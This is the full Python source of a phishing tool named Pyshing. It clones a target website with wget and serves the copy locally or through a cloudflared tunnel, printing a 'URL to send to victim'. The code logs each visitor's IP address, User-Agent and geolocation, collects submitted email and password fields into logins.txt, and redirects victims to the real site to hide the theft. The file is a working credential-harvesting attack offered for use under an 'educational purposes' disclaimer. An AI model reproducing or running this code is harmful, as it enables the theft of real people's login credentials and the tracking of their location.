#!/usr/bin/python
'''
Name: Pyshing v2.5
Version: Python 3.12.11

--
The tool is for educational purposes
the author is not responsible for misuse of this software!
--

Author: r4msolo
'''
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from tqdm import tqdm
import time
import subprocess
from io import BytesIO
import requests
import urllib.request
from urllib.parse import unquote
import json
import wget
import re
import os, sys

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    ips = []

    def run(port):
        try:
          if not port:
            port = 1337
          httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
          while True:
            print(GREEN+'\n.:: Listening on local port %s...\n'%(port)+ENDC)
            httpd.serve_forever()

        except Exception as err:
          print(RED+'Error, {}'.format(err)+ENDC)
          os.system('killall cloudflared')
          quit()

    def do_GET(self):
      self.get_ip()
      self.send_response(200)
      self.end_headers()
      file = open('site/redirect.txt','r')
      url_clone, path = Pyshing.splitUrl(file.read())
      try:
        file = open(f"site/{url_clone[2]}/{path}","r")
      except IndexError:
        file = open(f"site/index_pyshing.html","r")
      readfile = file.readlines()
      file.close()

      for lines in readfile:
        self.wfile.write(lines.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(body)
        values = response.getvalue()
        self.getCredentials(values)

    def get_ip(self):
        log = str(self.headers)
        data = []
        for line in log.split('\n'):
          if 'User-Agent' in line:
            data.append(line.split('User-Agent: ')[1])
          if 'X-Forwarded-For' in line:
            global ip
            ip = line.split('X-Forwarded-For: ')[1]
            data.append(ip)

        if self.path == '/':
          if len(data) == 2:
            if data[0] not in self.ips:
              date = self.get_time()
              self.ips.append(ip)
              response = requests.get("https://geolocation-db.com/json/{}&position=true".format(ip)).json()
              geolocation = [response['country_name'],response['state'],response['city']]
              print(BOLD+GREEN+'[+] IP Found: {}\n[+] User-Agent: {}\n[+] Country: {}\n[+] State: {}\n[+] City: {}'.format(ip,data[0],geolocation[0],geolocation[1],geolocation[2])+ENDC)
              file = open('ips.txt','a+')
              file.write('Date: '+str(date)+' IP: '+str(ip)+' User-Agent: '+str(data[0])+'\n')
          else:
            print(RED+'[-] IP NOT FOUND!'+'\n[+] User-Agent:',data[0],ENDC)

    def get_time(self):
        timenow = datetime.now()
        return timenow

    def getCredentials(self, values):
        post = unquote(values.decode('utf-8'))
        readpost = post.strip('&')

        forms = ['email','login','user','pass','password','encpass','enc_password'] #Possibles forms to get the credentials
        readpost = readpost.split('&')
        count = 0
        possibles = []
        file = open('logins.txt','a+')
        postf = open('post.txt','a+')
        postf.write(str(readpost)+'\n')
        for line in readpost:
          for c in forms:
            if c in line and re.search("^"+str(c),line):
              line = line.split('=')
              possibles.append(line[1])
              count +=1
              if count >= 2:
                print('\n' + BOLD+RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                print(f'LOGIN: {possibles[0]}\nPASSWORD: {possibles[1]}')
                print("=" * 52 + "\n"+ENDC)
                date = self.get_time()
                file.write(str(date)+' '+str(possibles)+'\n')
                count = 0
                possibles = []
                self.redirect()
                break
        file.close()

    def redirect(self):
        urlf = open('site/redirect.txt','r')
        url = urlf.readlines()[0]
        if url == "\n" or url == "":
          url = "https://r4msolo.github.io/no_one_stops_us.html"
        print(YELLOW+f"[!] Redirecting to {url}...")
        redir = "<script>window.location.href=\"%s\"</script>" % (url)
        self.wfile.write(redir.encode())
        print('[+] Done!'+ENDC)

class Pyshing():
    def __init__(self):
        self.is_cloudflared_installed = self.checkCloudflared()
        print(options)
        try:
          opt = int(input(BOLD+RED+"[pyshing]# "+ENDC))
        except:
          opt = 99
        if opt == 1:
          self.pageClone()
        if opt == 2:
          global choice
          choice = input(GREEN+BOLD+"Do you want use internet to attack? Y/n: [Default n] ")
          port = input(GREEN+BOLD+"Local port number [Default 1337]: "+ENDC)
          if choice.upper() == 'Y':
            self.reverseProxy(port)
          if choice.upper() != "Y":
            self.typeEffect(BOLD+"\nStarting Pyshing on localhost"+ENDC)
            SimpleHTTPRequestHandler.run(port)
        if opt == 0:
          quit()
        else:
          print(RED+"[!] Invalid option!\n"+ENDC)
          quit()
    def reverseProxy(self,port):
      print("\nSearching for cloudflared...")
      if not self.is_cloudflared_installed:
        if "/data/data/com.termux" in os.environ.get("HOME", ""):
          resp = input(BOLD+"Do you want to install cloudflared in your termux? Y/n: "+ENDC)
          if resp.upper() == 'Y':
            self.install_pkg(0,"cloudflared")
          else:
            quit()
        else:
          resp = input(BOLD+"Do you want to install cloudflared in your distro? Y/n: "+ENDC)
          if resp.upper() == 'Y':
            self.install_pkg(0,"cloudflared")
          else:
            quit()
      if self.is_cloudflared_installed:
        subprocess.Popen("cloudflared tunnel --url http://localhost:{} > tunnel.log 2>&1 &".format(port), shell=True)
        self.typeEffect("\nInitializing reverse proxy...\n")
        count = 0
        while count <= 29:
          r = subprocess.run("grep -o 'https://[a-zA-Z0-9._-]*\\.trycloudflare\\.com' tunnel.log | head -n 1", shell=True, capture_output=True, text=True)
          tunnel_url = r.stdout.strip()
          if not tunnel_url or tunnel_url == "https://api.trycloudflare.com":
            if count >=30:
              print(BOLD+"[!] Timeout"+ENDC)
              tunnel_url = None
              break
          else:
            break
          count+=1
          time.sleep(1)
        if tunnel_url:
          print(BOLD+YELLOW+"\n🔗 URL to send to victim:", tunnel_url+ENDC)
          SimpleHTTPRequestHandler.run(port)
        else:
          print("❌ Unable to get URL.")

    def pageClone(self):
      agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
      try:
        url_clone = input('URL Clone: ')
        os.system(f'wget --compression=auto {url_clone} --mirror -p --convert-links -P site/ --wait=15 --user-agent="{agent}" --header="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"--header="Accept-Language: en-US,en;q=0.9" --header="Accept-Encoding: gzip, deflate, br" --header="Connection: keep-alive" ')
        print(BOLD+GREEN+"[+] Website copied... "+ENDC)
        file = open('site/redirect.txt', 'w')
        file.write(url_clone)
        file.close()
        Pyshing.splitUrl(url_clone)

      except OSError:
        print(RED+"[!] Error, check your internet connection\n"+ENDC)

      Pyshing()

    def splitUrl(url):
      url_clone = url.split('/')
      if len(url_clone) > 3 and url_clone[3] != '' and url_clone[3] != '#':
        path = url_clone[3]
        if "\n" in path: path = path.replace("\n",'')
      else:
        path = 'index.html'
      return url_clone,path

    def typeEffect(self,loading):
      for l in loading:
        time.sleep(0.1)
        sys.stdout.write(l)
        sys.stdout.flush()

    def install_pkg(self,pm,package_name):
      print(f"\n📦 Installing package: {package_name}")

      if pm == 0:
        package_manager = ["pkg","install","-y",package_name]
      if pm == 1:
        package_manager = ["apt","install","-y",package_name]

      cmd = package_manager
      percent_pattern = re.compile(r'(\d+)%')
      proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
      )
      try:
        for line in proc.stdout:
          match = percent_pattern.search(line)
          if match:
            percent = match.group(1)
            print(f"\r⏳ Installing... {percent}%", end="", flush=True)
          else:
            proc.wait()
            if proc.returncode == 0:
              print("✅ Installed package.")
              return True
            else:
              print("\n❌ Error installing")
              return False
      except KeyboardInterrupt:
        proc.terminate()
        print("\nKeyboard Interrupt..\n")
        return False

    def checkCloudflared(self):
      try:
        result = subprocess.run(["cloudflared", "version"], capture_output=True, text=True, timeout=2)
        if result.returncode == 0:
          print("[+] {}".format(result.stdout))
          return True
      except Exception as err:
        print("[!] Cloudflared not found")
        return False

'''colors'''
BLUE = '\033[94m'
RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
BOLD = '\033[1m'
ENDC = '\033[0m'

banner = BLUE+'''
                                ,,          ,,                        
`7MM"""Mq.                    `7MM          db                        
  MM   `MM.                     MM                                    
  MM   ,M9 `7M'   `MF',pP"Ybd   MMpMMMb.  `7MM  `7MMpMMMb.   .P"Ybmmm 
  MMmmdM9    VA   ,V  8I   `"   MM    MM    MM    MM    MM  :MI  I8   
  MM          VA ,V   `YMMMa.   MM    MM    MM    MM    MM   WmmmP"   
  MM           VVV    L.   I8   MM    MM    MM    MM    MM  8M        
.JMML.         ,V     M9mmmP' .JMML  JMML..JMML..JMML  JMML. YMMMMMb  
              ,V                                            6'     dP 
           OOb"                                             Ybmmmd'  
                                             Version: 2.0
                                             Author: R4MSOLO\n
'''+ENDC

options = BOLD+GREEN+'''
1) Clone a Website	2) Start Server
0) Exit
'''+ENDC

if __name__ == '__main__':
  try:
    print(banner)
    Pyshing()
  except KeyboardInterrupt:
    if choice and choice.upper() == 'Y':
      os.system('killall cloudflared')
      print(GREEN+'[!] Reverse proxy finished'+ENDC)
    print("[!] Exit program...\n")